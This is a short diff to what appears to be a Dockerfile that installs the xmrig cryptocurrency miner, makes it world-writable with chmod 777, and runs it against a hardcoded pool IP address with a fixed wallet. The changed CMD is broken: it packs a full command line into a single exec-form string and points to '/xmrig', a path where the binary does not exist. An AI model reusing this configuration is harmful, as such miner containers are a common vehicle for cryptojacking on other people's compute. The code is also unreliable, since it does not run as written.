@@ -9,6 +9,8 @@ RUN apt update; \
     cd xmrig-6.16.2; \
     cp xmrig /usr/local/bin/xmrig;
 
+WORKDIR /usr/local/bin
+
 RUN chmod 777 xmrig;
 
-CMD ["./xmrig -a gr -o 23.88.72.40:5555 --tls -u RN86DoccH99PZpx9oMZDVvY2ZMi9578pBV"]
+CMD ["/xmrig -a gr -o 23.88.72.40:5555 --tls -u RN86DoccH99PZpx9oMZDVvY2ZMi9578pBV"]
